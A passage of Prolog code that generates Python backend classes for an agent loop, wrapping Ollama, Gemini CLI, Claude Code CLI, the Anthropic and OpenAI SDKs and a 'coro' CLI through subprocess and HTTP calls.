%% For SDK backends (sdk_guard present), base import has \n\n separator and
%% sdk_import_guard fragment follows; otherwise triple-newline separator.
generate_backend_header(S, BackendName) :-
    agent_backend(BackendName, Props),
    member(description(Desc), Props),
    format(S, '"""~w"""~n~n', [Desc]),
    agent_loop_components:backend_import_specs(Props, ImportSpecs),
    agent_loop_components:emit_module_imports(S, ImportSpecs),
    (member(sdk_guard(SDK), Props) ->
        %% SDK backends: base import + sdk_import_guard fragment
        write(S, 'from .base import AgentBackend, AgentResponse, ToolCall\n\n'),
        upcase_atom(SDK, SDKUpper),
        write_py(S, sdk_import_guard, [sdk=SDK, 'SDK_UPPER'=SDKUpper])
    ;
        %% Standard backends: base import with triple newline
        write(S, 'from .base import AgentBackend, AgentResponse, ToolCall\n\n\n')
    ).

%% Emit class declaration + class docstring
generate_backend_class_decl(S, BackendName) :-
    agent_backend(BackendName, Props),
    member(class_name(ClassName), Props),
    member(class_docstring(ClassDoc), Props),
    format(S, 'class ~w(AgentBackend):~n', [ClassName]),
    format(S, '    """~w"""~n~n', [ClassDoc]).

%% Emit send_message signature (identical for all backends)
generate_send_message_sig(S) :-
    write(S, '    def send_message(self, message: str, context: list[dict], **kwargs) -> AgentResponse:\n').

%% Emit trailing helper fragments + name property
generate_backend_helpers(S, BackendName) :-
    agent_backend(BackendName, Props),
    member(helper_fragments(Frags), Props),
    agent_loop_components:emit_backend_helper_fragments(S, [backend(BackendName), fragments(Frags)]),
    member(display_name(DN), Props),
    write_py(S, name_property, [display_name=DN]).

%% Route describe_tool_call_* fragments to the data-driven generator;
%% all other fragments emit directly via write_py.
emit_helper_fragment(S, Backend, F) :-
    (atom_concat(describe_tool_call_, _, F) ->
        generate_describe_tool_call(S, Backend),
        write(S, '\n')
    ;
        write_py(S, F),
        write(S, '\n')
    ).

%% --- generate_describe_tool_call/2: emit _describe_tool_call from tool_description/5 facts ---

generate_describe_tool_call(S, Backend) :-
    findall(td(TN, V, PK, DM), tool_description(Backend, TN, V, PK, DM), Entries),
    write(S, '    def _describe_tool_call(self, tool_name: str, params: dict) -> str:\n'),
    write(S, '        """Create a short description of a tool call."""\n'),
    generate_describe_entries(S, Backend, Entries, first).

generate_describe_entries(S, Backend, [td(TN, V, PK, DM)], _Pos) :-
    !,
    %% Last entry — emit elif then fallback
    generate_one_describe(S, elif, TN, V, PK, DM),
    generate_describe_fallback(S, Backend).
generate_describe_entries(S, Backend, [td(TN, V, PK, DM)|Rest], first) :-
    !,
    generate_one_describe(S, 'if', TN, V, PK, DM),
    generate_describe_entries(S, Backend, Rest, subsequent).
generate_describe_entries(S, Backend, [td(TN, V, PK, DM)|Rest], subsequent) :-
    generate_one_describe(S, elif, TN, V, PK, DM),
    generate_describe_entries(S, Backend, Rest, subsequent).

%% basename: f"verb {os.path.basename(params.get('key', '?'))}"
generate_one_describe(S, IfOrElif, TN, Verb, PK, basename) :-
    format(S, '        ~w tool_name == \'~w\':~n', [IfOrElif, TN]),
    format(S, '            return f"~w {os.path.basename(params.get(\'~w\', \'?\'))}"~n', [Verb, PK]).

%% raw: f"verb {params.get('key', '?')}"
generate_one_describe(S, IfOrElif, TN, Verb, PK, raw) :-
    format(S, '        ~w tool_name == \'~w\':~n', [IfOrElif, TN]),
    format(S, '            return f"~w {params.get(\'~w\', \'?\')}"~n', [Verb, PK]).

%% truncate(N): multi-line with cmd[:N-3] + '...'
generate_one_describe(S, IfOrElif, TN, Verb, PK, truncate(MaxLen)) :-
    TruncLen is MaxLen - 3,
    format(S, '        ~w tool_name == \'~w\':~n', [IfOrElif, TN]),
    format(S, '            cmd = params.get(\'~w\', \'?\')~n', [PK]),
    format(S, '            if len(cmd) > ~w:~n', [MaxLen]),
    format(S, '                cmd = cmd[:~w] + \'...\'~n', [TruncLen]),
    format(S, '            return f"~w {cmd}"~n', [Verb]).

%% Fallback: openrouter uses bare return, others use else block
generate_describe_fallback(S, openrouter_api) :-
    !,
    write(S, '        return tool_name\n').
generate_describe_fallback(S, _) :-
    write(S, '        else:\n'),
    write(S, '            return tool_name\n').

%% --- generate_tool_dispatch/1: emit self.tools dict + self.destructive_tools set ---

generate_tool_dispatch(S) :-
    agent_loop_components:register_agent_loop_components,
    write(S, '\n        self.tools = {\n'),
    agent_loop_components:emit_tool_dispatch_entries(S, [target(python)]),
    write(S, '        }\n'),
    write(S, '\n        self.destructive_tools = {'),
    findall(DT, (component(agent_tools, DT, tool_handler, Cfg),
                 member(destructive(true), Cfg)), DTs),
    write_set_elements(S, DTs),
    write(S, '}\n').

write_set_elements(_, []).
write_set_elements(S, [DT]) :-
    format(S, '\'~w\'', [DT]).
write_set_elements(S, [DT|Rest]) :-
    Rest \= [],
    format(S, '\'~w\', ', [DT]),
    write_set_elements(S, Rest).

%% format_python_string_list(+AtomList, -FormattedString)
%% Converts [bash, read, write, edit] to the atom ['bash', 'read', 'write', 'edit']
format_python_string_list(Items, Result) :-
    format_py_str_items(Items, Inner),
    atom_concat('[', Inner, Tmp),
    atom_concat(Tmp, ']', Result).

format_py_str_items([], '').
format_py_str_items([X], Result) :-
    format(atom(Result), '\'~w\'', [X]).
format_py_str_items([X|Xs], Result) :-
    Xs \= [],
    format(atom(First), '\'~w\', ', [X]),
    format_py_str_items(Xs, RestStr),
    atom_concat(First, RestStr, Result).

%% --- ollama_cli (uses: format_prompt, clean_output_simple, list_models_cli, name_property) ---

generate_backend_full(S, ollama_cli, _) :-
    generate_backend_header(S, ollama_cli),
    generate_backend_class_decl(S, ollama_cli),
    write(S, '    def __init__(\n'),
    write(S, '        self,\n'),
    write(S, '        command: str = "ollama",\n'),
    write(S, '        model: str = "llama3",\n'),
    write(S, '        timeout: int = 300\n'),
    write(S, '    ):\n'),
    write(S, '        self.command = command\n'),
    write(S, '        self.model = model\n'),
    write(S, '        self.timeout = timeout\n\n'),
    generate_send_message_sig(S),
    write(S, '        """Send message to Ollama CLI and get response."""\n'),
    write(S, '        prompt = self._format_prompt(message, context)\n\n'),
    write(S, '        cmd = [self.command, "run", self.model]\n\n'),
    write(S, '        try:\n'),
    write(S, '            result = subprocess.run(\n'),
    write(S, '                cmd,\n'),
    write(S, '                input=prompt,\n'),
    write(S, '                capture_output=True,\n'),
    write(S, '                text=True,\n'),
    write(S, '                timeout=self.timeout\n'),
    write(S, '            )\n\n'),
    write(S, '            output = result.stdout\n'),
    write(S, '            if result.returncode != 0 and result.stderr:\n'),
    write(S, '                output = f"[Error: {result.stderr.strip()}]"\n\n'),
    write(S, '        except subprocess.TimeoutExpired:\n'),
    write(S, '            return AgentResponse(\n'),
    write(S, '                content=f"[Error: Command timed out after {self.timeout} seconds]",\n'),
    write(S, '                tokens={}\n'),
    write(S, '            )\n'),
    write(S, '        except FileNotFoundError:\n'),
    write(S, '            return AgentResponse(\n'),
    write(S, '                content=f"[Error: Command \'{self.command}\' not found. Install Ollama from https://ollama.ai]",\n'),
    write(S, '                tokens={}\n'),
    write(S, '            )\n'),
    write(S, '        except Exception as e:\n'),
    write(S, '            return AgentResponse(\n'),
    write(S, '                content=f"[Error: {e}]",\n'),
    write(S, '                tokens={}\n'),
    write(S, '            )\n\n'),
    write(S, '        content = self._clean_output(output)\n\n'),
    write(S, '        return AgentResponse(\n'),
    write(S, '            content=content,\n'),
    write(S, '            tool_calls=[],\n'),
    write(S, '            tokens={},\n'),
    write(S, '            raw=output\n'),
    write(S, '        )\n\n'),
    generate_backend_helpers(S, ollama_cli).

%% --- ollama_api (uses: messages_builder_ollama, list_models_api, name_property) ---

generate_backend_full(S, ollama_api, _) :-
    generate_backend_header(S, ollama_api),
    generate_backend_class_decl(S, ollama_api),
    write(S, '    def __init__(\n        self,\n        host: str = "localhost",\n'),
    write(S, '        port: int = 11434,\n        model: str = "llama3",\n'),
    write(S, '        system_prompt: str | None = None,\n        timeout: int = 300\n    ):\n'),
    write(S, '        self.host = host\n        self.port = port\n        self.model = model\n'),
    write(S, '        self.system_prompt = system_prompt or "You are a helpful assistant."\n'),
    write(S, '        self.timeout = timeout\n'),
    write(S, '        self.base_url = f"http://{host}:{port}"\n\n'),
    generate_send_message_sig(S),
    write(S, '        """Send message to Ollama API and get response."""\n'),
    write_py(S, messages_builder_ollama),
    write(S, '\n        # Build request\n'),
    write(S, '        payload = {\n            "model": self.model,\n'),
    write(S, '            "messages": messages,\n            "stream": False\n        }\n\n'),
    write(S, '        try:\n            url = f"{self.base_url}/api/chat"\n'),
    write(S, '            data = json.dumps(payload).encode(\'utf-8\')\n'),
    write(S, '            req = urllib.request.Request(\n                url,\n                data=data,\n'),
    write(S, '                headers={"Content-Type": "application/json"},\n                method="POST"\n            )\n\n'),
    write(S, '            with urllib.request.urlopen(req, timeout=self.timeout) as response:\n'),
    write(S, '                result = json.loads(response.read().decode(\'utf-8\'))\n\n'),
    write(S, '            content = result.get("message", {}).get("content", "")\n\n'),
    write(S, '            tokens = {}\n'),
    write(S, '            if "eval_count" in result:\n                tokens["output"] = result["eval_count"]\n'),
    write(S, '            if "prompt_eval_count" in result:\n                tokens["input"] = result["prompt_eval_count"]\n\n'),
    write(S, '            return AgentResponse(\n                content=content,\n                tool_calls=[],\n'),
    write(S, '                tokens=tokens,\n                raw=result\n            )\n\n'),
    write(S, '        except urllib.error.URLError as e:\n'),
    write(S, '            return AgentResponse(\n'),
    write(S, '                content=f"[Error: Cannot connect to Ollama at {self.base_url}. Is Ollama running? Error: {e}]",\n'),
    write(S, '                tokens={}\n            )\n'),
    write(S, '        except json.JSONDecodeError as e:\n'),
    write(S, '            return AgentResponse(\n'),
    write(S, '                content=f"[Error: Invalid JSON response from Ollama: {e}]",\n'),
    write(S, '                tokens={}\n            )\n'),
    write(S, '        except Exception as e:\n            return AgentResponse(\n'),
    write(S, '                content=f"[Error: {e}]",\n                tokens={}\n            )\n\n'),
    generate_backend_helpers(S, ollama_api).

%% --- gemini (uses: popen_setup, stream_json_parser_gemini, describe_tool_call_gemini, format_prompt) ---

generate_backend_full(S, gemini, _) :-
    generate_backend_header(S, gemini),
    generate_backend_class_decl(S, gemini),
    write(S, '    def __init__(self, command: str = "gemini", model: str = "gemini-3-flash-preview",\n'),
    write(S, '                 sandbox: bool = False, approval_mode: str = "yolo",\n'),
    write(S, '                 allowed_tools: list[str] | None = None):\n'),
    write(S, '        self.command = command\n        self.model = model\n'),
    write(S, '        self.sandbox = sandbox\n        self.approval_mode = approval_mode\n'),
    write(S, '        self.allowed_tools = allowed_tools or []\n'),
    write(S, '        self._on_status = None\n\n'),
    generate_send_message_sig(S),
    write(S, '        """Send message to Gemini CLI with live streaming output."""\n'),
    write(S, '        prompt = self._format_prompt(message, context)\n'),
    write(S, '        self._on_status = kwargs.get(\'on_status\')\n\n'),
    write(S, '        cmd = [\n            self.command,\n            "-m", self.model,\n'),
    write(S, '            "-o", "stream-json",\n        ]\n'),
    write(S, '        if self.sandbox:\n            cmd.append("-s")\n'),
    write(S, '        if self.approval_mode:\n            cmd.extend(["--approval-mode", self.approval_mode])\n'),
    write(S, '        for tool in self.allowed_tools:\n            cmd.extend(["--allowed-tools", tool])\n'),
    write(S, '        cmd.extend(["-p", prompt])\n\n        try:\n'),
    write_py(S, popen_setup),
    write_py(S, stream_json_parser_gemini),
    write(S, '\n'),
    write(S, '        except subprocess.TimeoutExpired:\n            proc.kill()\n'),
    write(S, '            return AgentResponse(content="[Error: Command timed out]", tokens={})\n'),
    write(S, '        except FileNotFoundError:\n'),
    write(S, '            return AgentResponse(\n'),
    write(S, '                content=f"[Error: Command \'{self.command}\' not found. Install Gemini CLI.]",\n'),
    write(S, '                tokens={})\n'),
    write(S, '        except Exception as e:\n'),
    write(S, '            return AgentResponse(content=f"[Error: {e}]", tokens={})\n\n'),
    generate_backend_helpers(S, gemini).

%% --- claude_code (uses: popen_setup, stream_json_parser_claude_code, describe_tool_call_claude_code, format_prompt) ---

generate_backend_full(S, claude_code, _) :-
    generate_backend_header(S, claude_code),
    generate_backend_class_decl(S, claude_code),
    write(S, '    def __init__(self, command: str = "claude", model: str = "sonnet"):\n'),
    write(S, '        self.command = command\n        self.model = model\n'),
    write(S, '        self._on_status = None\n\n'),
    generate_send_message_sig(S),
    write(S, '        """Send message to Claude Code CLI with live streaming output."""\n'),
    write(S, '        prompt = self._format_prompt(message, context)\n'),
    write(S, '        self._on_status = kwargs.get(\'on_status\')\n\n'),
    write(S, '        cmd = [\n            self.command,\n            "-p",\n            "--verbose",\n'),
    write(S, '            "--output-format", "stream-json",\n            "--model", self.model,\n'),
    write(S, '            prompt\n        ]\n\n        try:\n'),
    write_py(S, popen_setup),
    write_py(S, stream_json_parser_claude_code),
    write(S, '\n'),
    write(S, '        except subprocess.TimeoutExpired:\n            proc.kill()\n'),
    write(S, '            return AgentResponse(content="[Error: Command timed out]", tokens={})\n'),
    write(S, '        except FileNotFoundError:\n'),
    write(S, '            return AgentResponse(\n'),
    write(S, '                content=f"[Error: Command \'{self.command}\' not found. Install with: npm install -g @anthropic-ai/claude-code]",\n'),
    write(S, '                tokens={})\n'),
    write(S, '        except Exception as e:\n'),
    write(S, '            return AgentResponse(content=f"[Error: {e}]", tokens={})\n\n'),
    generate_backend_helpers(S, claude_code).

%% --- claude_api (uses: sdk_import_guard, api_key_from_env, messages_builder_anthropic, extract_tool_calls_anthropic) ---

generate_backend_full(S, claude_api, _) :-
    generate_backend_header(S, claude_api),
    write(S, '\n'),
    generate_backend_class_decl(S, claude_api),
    write(S, '    def __init__(\n        self,\n        api_key: str | None = None,\n'),
    write(S, '        model: str = "claude-sonnet-4-20250514",\n        max_tokens: int = 4096,\n'),
    write(S, '        system_prompt: str | None = None\n    ):\n'),
    write_py(S, sdk_init_guard, ['SDK_UPPER'='ANTHROPIC', sdk=anthropic]),
    write_py(S, api_key_from_env, [env_var='ANTHROPIC_API_KEY']),
    write(S, '\n        self.model = model\n        self.max_tokens = max_tokens\n'),
    write(S, '        self.system_prompt = system_prompt or (\n'),
    write(S, '            "You are a helpful AI assistant. Be concise and direct."\n        )\n\n'),
    write(S, '        self.client = anthropic.Anthropic(api_key=self.api_key)\n\n'),
    generate_send_message_sig(S),
    write(S, '        """Send message to Claude API and get response."""\n'),
    write_py(S, messages_builder_anthropic),
    write(S, '\n        try:\n'),
    write(S, '            response = self.client.messages.create(\n'),
    write(S, '                model=self.model,\n                max_tokens=self.max_tokens,\n'),
    write(S, '                system=self.system_prompt,\n                messages=messages\n            )\n\n'),
    write(S, '            content = ""\n            for block in response.content:\n'),
    write(S, '                if hasattr(block, \'text\'):\n                    content += block.text\n\n'),
    write(S, '            tokens = {}\n            if hasattr(response, \'usage\'):\n'),
    write(S, '                tokens = {\n                    \'input\': response.usage.input_tokens,\n'),
    write(S, '                    \'output\': response.usage.output_tokens\n                }\n\n'),
    write(S, '            tool_calls = self._extract_tool_calls(response)\n\n'),
    write(S, '            return AgentResponse(\n                content=content,\n'),
    write(S, '                tool_calls=tool_calls,\n                tokens=tokens,\n'),
    write(S, '                raw=response\n            )\n\n'),
    write_py(S, error_handler_api_sdk, [sdk=anthropic]),
    write(S, '\n'),
    write_py(S, extract_tool_calls_anthropic),
    write(S, '\n'),
    %% Streaming method
    write(S, '    def send_message_streaming(\n        self,\n        message: str,\n'),
    write(S, '        context: list[dict],\n        on_token: callable = None\n    ) -> AgentResponse:\n'),
    write(S, '        """Send message with streaming response.\n\n'),
    write(S, '        Args:\n            message: The message to send\n'),
    write(S, '            context: Conversation context\n'),
    write(S, '            on_token: Callback called for each token chunk (str) -> None\n        """\n'),
    write(S, '        messages = []\n        for msg in context:\n'),
    write(S, '            if msg.get(\'role\') in (\'user\', \'assistant\'):\n'),
    write(S, '                messages.append({\n                    "role": msg[\'role\'],\n'),
    write(S, '                    "content": msg[\'content\']\n                })\n'),
    write(S, '        # Note: current message is already in context (added by agent_loop)\n\n'),
    write(S, '        try:\n            content_parts = []\n'),
    write(S, '            input_tokens = 0\n            output_tokens = 0\n\n'),
    write(S, '            with self.client.messages.stream(\n                model=self.model,\n'),
    write(S, '                max_tokens=self.max_tokens,\n                system=self.system_prompt,\n'),
    write(S, '                messages=messages\n            ) as stream:\n'),
    write(S, '                for text in stream.text_stream:\n                    content_parts.append(text)\n'),
    write(S, '                    if on_token:\n                        on_token(text)\n\n'),
    write(S, '                response = stream.get_final_message()\n'),
    write(S, '                if hasattr(response, \'usage\'):\n'),
    write(S, '                    input_tokens = response.usage.input_tokens\n'),
    write(S, '                    output_tokens = response.usage.output_tokens\n\n'),
    write(S, '            content = "".join(content_parts)\n'),
    write(S, '            return AgentResponse(\n                content=content,\n'),
    write(S, '                tool_calls=[],\n'),
    write(S, '                tokens={\'input\': input_tokens, \'output\': output_tokens},\n'),
    write(S, '                raw=response\n            )\n\n'),
    write_py(S, error_handler_api_sdk, [sdk=anthropic]),
    write(S, '\n'),
    write_py(S, supports_streaming_true, [backend_name='Claude API']),
    write(S, '\n'),
    write_py(S, name_property, [display_name='Claude API ({self.model})']).

%% --- openai_api (uses: sdk_import_guard, api_key_from_env, messages_builder_system, extract_tool_calls_openai) ---

generate_backend_full(S, openai_api, _) :-
    generate_backend_header(S, openai_api),
    write(S, '\n'),
    generate_backend_class_decl(S, openai_api),
    write(S, '    def __init__(\n        self,\n        api_key: str | None = None,\n'),
    write(S, '        model: str = "gpt-4o",\n        max_tokens: int = 4096,\n'),
    write(S, '        system_prompt: str | None = None,\n        base_url: str | None = None\n    ):\n'),
    write_py(S, sdk_init_guard, ['SDK_UPPER'='OPENAI', sdk=openai]),
    write_py(S, api_key_from_env, [env_var='OPENAI_API_KEY']),
    write(S, '\n        self.model = model\n        self.max_tokens = max_tokens\n'),
    write(S, '        self.system_prompt = system_prompt or (\n'),
    write(S, '            "You are a helpful AI assistant. Be concise and direct."\n        )\n'),
    write(S, '        self.base_url = base_url\n\n'),
    write(S, '        client_kwargs = {"api_key": self.api_key}\n'),
    write(S, '        if self.base_url:\n            client_kwargs["base_url"] = self.base_url\n\n'),
    write(S, '        self.client = openai.OpenAI(**client_kwargs)\n\n'),
    generate_send_message_sig(S),
    write(S, '        """Send message to OpenAI API and get response."""\n'),
    write_py(S, messages_builder_system),
    write(S, '\n        # Note: current message is already in context (added by agent_loop)\n\n'),
    write(S, '        try:\n'),
    write(S, '            response = self.client.chat.completions.create(\n'),
    write(S, '                model=self.model,\n                max_tokens=self.max_tokens,\n'),
    write(S, '                messages=messages\n            )\n\n'),
    write(S, '            content = ""\n            if response.choices and len(response.choices) > 0:\n'),
    write(S, '                choice = response.choices[0]\n'),
    write(S, '                if choice.message and choice.message.content:\n'),
    write(S, '                    content = choice.message.content\n\n'),
    write(S, '            tokens = {}\n            if response.usage:\n'),
    write(S, '                tokens = {\n                    \'input\': response.usage.prompt_tokens,\n'),
    write(S, '                    \'output\': response.usage.completion_tokens,\n'),
    write(S, '                    \'total\': response.usage.total_tokens\n                }\n\n'),
    write(S, '            tool_calls = self._extract_tool_calls(response)\n\n'),
    write(S, '            return AgentResponse(\n                content=content,\n'),
    write(S, '                tool_calls=tool_calls,\n                tokens=tokens,\n'),
    write(S, '                raw=response\n            )\n\n'),
    write_py(S, error_handler_api_sdk, [sdk=openai]),
    write(S, '\n'),
    write_py(S, extract_tool_calls_openai),
    write(S, '\n'),
    %% Streaming method
    write(S, '    def send_message_streaming(\n        self,\n        message: str,\n'),
    write(S, '        context: list[dict],\n        on_token: callable = None\n    ) -> AgentResponse:\n'),
    write(S, '        """Send message with streaming response.\n\n'),
    write(S, '        Args:\n            message: The message to send\n'),
    write(S, '            context: Conversation context\n'),
    write(S, '            on_token: Callback called for each token chunk (str) -> None\n        """\n'),
    write(S, '        messages = [{"role": "system", "content": self.system_prompt}]\n'),
    write(S, '        for msg in context:\n'),
    write(S, '            if msg.get(\'role\') in (\'user\', \'assistant\'):\n'),
    write(S, '                messages.append({\n                    "role": msg[\'role\'],\n'),
    write(S, '                    "content": msg[\'content\']\n                })\n'),
    write(S, '        messages.append({"role": "user", "content": message})\n\n'),
    write(S, '        try:\n            content_parts = []\n\n'),
    write(S, '            stream = self.client.chat.completions.create(\n'),
    write(S, '                model=self.model,\n                max_tokens=self.max_tokens,\n'),
    write(S, '                messages=messages,\n                stream=True,\n'),
    write(S, '                stream_options={"include_usage": True}\n            )\n\n'),
    write(S, '            input_tokens = 0\n            output_tokens = 0\n\n'),
    write(S, '            for chunk in stream:\n'),
    write(S, '                if chunk.choices and len(chunk.choices) > 0:\n'),
    write(S, '                    delta = chunk.choices[0].delta\n'),
    write(S, '                    if delta and delta.content:\n'),
    write(S, '                        content_parts.append(delta.content)\n'),
    write(S, '                        if on_token:\n                            on_token(delta.content)\n\n'),
    write(S, '                if chunk.usage:\n'),
    write(S, '                    input_tokens = chunk.usage.prompt_tokens\n'),
    write(S, '                    output_tokens = chunk.usage.completion_tokens\n\n'),
    write(S, '            content = "".join(content_parts)\n'),
    write(S, '            return AgentResponse(\n                content=content,\n'),
    write(S, '                tool_calls=[],\n'),
    write(S, '                tokens={\'input\': input_tokens, \'output\': output_tokens},\n'),
    write(S, '                raw=None\n            )\n\n'),
    write_py(S, error_handler_api_sdk, [sdk=openai]),
    write(S, '\n'),
    write_py(S, supports_streaming_true, [backend_name='OpenAI API']),
    write(S, '\n'),
    write_py(S, name_property, [display_name='OpenAI ({self.model})']).

%% --- coro (uses: format_prompt, name_property — mostly unique imperative logic) ---

generate_backend_full(S, coro, _) :-
    generate_backend_header(S, coro),
    generate_backend_class_decl(S, coro),
    write(S, '    def __init__(self, command: str = "coro", verbose: bool = True,\n'),
    write(S, '                 debug: bool = True, max_steps: int = 0,\n'),
    write(S, '                 config: str | None = None, no_fallback: bool = False,\n'),
    write(S, '                 max_context_tokens: int = 0):\n'),
    write(S, '        self.command = command\n        self.verbose = verbose\n'),
    write(S, '        self.debug = debug\n        self.max_steps = max_steps\n'),
    write(S, '        self.config = config or self._find_config(no_fallback=no_fallback)\n'),
    write(S, '        self.max_context_tokens = max_context_tokens\n'),
    write(S, '        self._temp_config = None\n'),
    write(S, '        self.model = self._read_model_from_config()\n\n'),
    write(S, '        if self.max_context_tokens > 0:\n'),
    write(S, '            self._temp_config = self._create_limited_config()\n'),
    write(S, '        self.token_pattern = re.compile(\n'),
    write(S, '            r\'(?:Input|Output|Total):\\s*([\\d,]+)\\s*tokens?\',\n'),
    write(S, '            re.IGNORECASE\n        )\n'),
    write(S, '        self._coro_token_pattern = re.compile(\n'),
    write(S, '            r\'Tokens:\\s*(\\d+)\\s*input\\s*\\+\\s*(\\d+)\\s*output\\s*=\\s*(\\d+)\\s*total\'\n        )\n'),
    write(S, '        self._duration_pattern = re.compile(r\'Duration:\\s*([\\d.]+)s\')\n'),
    write(S, '        self._ansi_pattern = re.compile(r\'\\x1b\\[[0-9;]*[A-Za-z]\')\n\n'),
    %% Config discovery methods
    write(S, '    def _find_config(self, no_fallback: bool = False) -> str | None:\n'),
    write(S, '        """Find coro-native config (coro.json only)."""\n'),
    write(S, '        if os.path.isfile(\'coro.json\'):\n            return None\n'),
    write(S, '        if no_fallback:\n            return None\n'),
    write(S, '        path = os.path.expanduser(\'~/coro.json\')\n'),
    write(S, '        if os.path.isfile(path):\n            return path\n'),
    write(S, '        return None\n\n'),
    write(S, '    def _read_coro_config(self) -> dict:\n'),
    write(S, '        """Read the full coro config from the best available path."""\n'),
    write(S, '        candidates = [self.config] if self.config else []\n'),
    write(S, '        for name in [\'uwsal.json\', \'coro.json\']:\n'),
    write(S, '            if os.path.isfile(name):\n                candidates.append(name)\n'),
    write(S, '            home = os.path.expanduser(f\'~/{name}\')\n'),
    write(S, '            if os.path.isfile(home):\n                candidates.append(home)\n'),
    write(S, '        for path in candidates:\n            try:\n'),
    write(S, '                with open(path) as f:\n                    return _json.load(f)\n'),
    write(S, '            except Exception:\n                continue\n'),
    write(S, '        return {}\n\n'),
    write(S, '    def _read_model_from_config(self) -> str:\n'),
    write(S, '        """Read model name from coro config file."""\n'),
    write(S, '        return self._read_coro_config().get(\'model\', \'unknown\')\n\n'),
    write(S, '    def _create_limited_config(self) -> str | None:\n'),
    write(S, '        """Create a temp coro.json with max_token set to limit context."""\n'),
    write(S, '        base = self._read_coro_config()\n'),
    write(S, '        if not base:\n            return None\n'),
    write(S, '        base[\'max_token\'] = self.max_context_tokens\n'),
    write(S, '        try:\n            tf = tempfile.NamedTemporaryFile(\n'),
    write(S, '                mode=\'w\', suffix=\'.json\', prefix=\'coro_\',\n'),
    write(S, '                delete=False\n            )\n'),
    write(S, '            _json.dump(base, tf, indent=2)\n            tf.close()\n'),
    write(S, '            return tf.name\n        except Exception:\n            return None\n\n'),
    %% send_message
    generate_send_message_sig(S),
    write(S, '        """Send message to coro CLI and get response."""\n'),
    write(S, '        prompt = self._format_prompt(message, context)\n\n'),
    write(S, '        cmd = [self.command]\n'),
    write(S, '        config_path = self._temp_config or self.config\n'),
    write(S, '        if config_path:\n            cmd.extend([\'-c\', config_path])\n'),
    write(S, '        if self.debug:\n            cmd.append(\'--debug\')\n'),
    write(S, '        elif self.verbose:\n            cmd.append(\'--verbose\')\n'),
    write(S, '        if self.max_steps > 0:\n'),
    write(S, '            cmd.extend([\'--max-steps\', str(self.max_steps)])\n'),
    write(S, '        cmd.append(prompt)\n\n'),
    write(S, '        try:\n            result = subprocess.run(\n                cmd,\n'),
    write(S, '                capture_output=True,\n                text=True,\n'),
    write(S, '                timeout=300\n            )\n'),
    write(S, '            output = result.stdout\n'),
    write(S, '            if result.stderr:\n                output += "\\n" + result.stderr\n\n'),
    write(S, '        except subprocess.TimeoutExpired:\n'),
    write(S, '            return AgentResponse(content="[Error: Command timed out after 5 minutes]", tokens={})\n'),
    write(S, '        except FileNotFoundError:\n'),
    write(S, '            return AgentResponse(content=f"[Error: Command \'{self.command}\' not found]", tokens={})\n'),
    write(S, '        except Exception as e:\n'),
    write(S, '            return AgentResponse(content=f"[Error: {e}]", tokens={})\n\n'),
    write(S, '        content = self._clean_output(output)\n'),
    write(S, '        tokens = self._parse_tokens(output)\n'),
    write(S, '        tool_calls = self.parse_tool_calls(output)\n\n'),
    write(S, '        return AgentResponse(\n            content=content,\n'),
    write(S, '            tool_calls=tool_calls,\n            tokens=tokens,\n'),
    write(S, '            raw=output\n        )\n\n'),
    write(S, '    def _strip_ansi(self, text: str) -> str:\n'),
    write(S, '        """Remove ANSI escape codes from text."""\n'),
    write(S, '        return self._ansi_pattern.sub(\'\', text)\n\n'),
    write_py(S, format_prompt), write(S, '\n'),
    %% _clean_output (coro-specific, too unique for a generic fragment)
    write(S, '    def _clean_output(self, output: str) -> str:\n'),
    write(S, '        """Clean up coro output, removing noise."""\n'),
    write(S, '        lines = output.split(\'\\n\')\n        cleaned = []\n        blank_count = 0\n\n'),
    write(S, '        for line in lines:\n            plain = self._strip_ansi(line)\n'),
    write(S, '            if self.token_pattern.search(plain):\n                continue\n'),
    write(S, '            if self._coro_token_pattern.search(plain):\n                continue\n'),
    write(S, '            if self._duration_pattern.search(plain):\n                continue\n'),
    write(S, '            if re.match(r\'^\\s*\\d{4}-\\d{2}-\\d{2}T\', plain):\n                continue\n'),
    write(S, '            stripped = plain.strip()\n'),
    write(S, '            if stripped and all(c in \'[0123456789ABCDJKHfm;\' for c in stripped):\n'),
    write(S, '                continue\n'),
    write(S, '            if stripped in [\'Previous conversation:\', \'Current request:\'] or \\\n'),
    write(S, '               stripped.startswith(\'Current request: \') or \\\n'),
    write(S, '               stripped.startswith(\'User: \') or \\\n'),
    write(S, '               stripped.startswith(\'Assistant: \'):\n                continue\n'),
    write(S, '            if stripped in [\'\', \'...\', \''),
    write(S, '\u2500'),
    write(S, '\' * 10]:\n                blank_count += 1\n'),
    write(S, '                if blank_count <= 1:\n                    cleaned.append(line)\n'),
    write(S, '                continue\n\n            blank_count = 0\n            cleaned.append(line)\n\n'),
    write(S, '        result = \'\\n\'.join(cleaned).strip()\n'),
    write(S, '        result = self._strip_ansi(result)\n\n'),
    write(S, '        for prefix in [\'A:\', \'Assistant:\', \'Claude:\']:\n'),
    write(S, '            if result.startswith(prefix):\n'),
    write(S, '                result = result[len(prefix):].strip()\n                break\n\n'),
    write(S, '        return result\n\n'),
    %% _parse_tokens
    write(S, '    def _parse_tokens(self, output: str) -> dict[str, int]:\n'),
    write(S, '        """Extract token counts from output."""\n'),
    write(S, '        plain = self._strip_ansi(output)\n        tokens = {}\n\n'),
    write(S, '        match = self._coro_token_pattern.search(plain)\n'),
    write(S, '        if match:\n'),
    write(S, '            tokens[\'input\'] = int(match.group(1))\n'),
    write(S, '            tokens[\'output\'] = int(match.group(2))\n'),
    write(S, '            tokens[\'total\'] = int(match.group(3))\n'),
    write(S, '            dur = self._duration_pattern.search(plain)\n'),
    write(S, '            if dur:\n                tokens[\'duration\'] = float(dur.group(1))\n'),
    write(S, '            return tokens\n\n'),
    write(S, '        for match in self.token_pattern.finditer(plain):\n'),
    write(S, '            line = plain[max(0, match.start()-20):match.end()]\n'),
    write(S, '            count = int(match.group(1).replace(\',\', \'\'))\n\n'),
    write(S, '            if \'input\' in line.lower():\n'),
    write(S, '                tokens[\'input\'] = tokens.get(\'input\', 0) + count\n'),
    write(S, '            elif \'output\' in line.lower():\n'),
    write(S, '                tokens[\'output\'] = tokens.get(\'output\', 0) + count\n'),
    write(S, '            elif \'total\' in line.lower():\n'),
    write(S, '                tokens[\'total\'] = count\n\n'),
    write(S, '        return tokens\n\n'),
    write(S, '    def parse_tool_calls(self, response: str) -> list[ToolCall]:\n'),
    write(S, '        """Extract tool calls from coro output."""\n'),
    write(S, '        return []\n\n'),
    generate_backend_helpers(S, coro).

%% --- openrouter_api (uses: messages_builder_openrouter, describe_tool_call_openrouter, sse_streaming_openrouter) ---

generate_backend_full(S, openrouter_api, _) :-
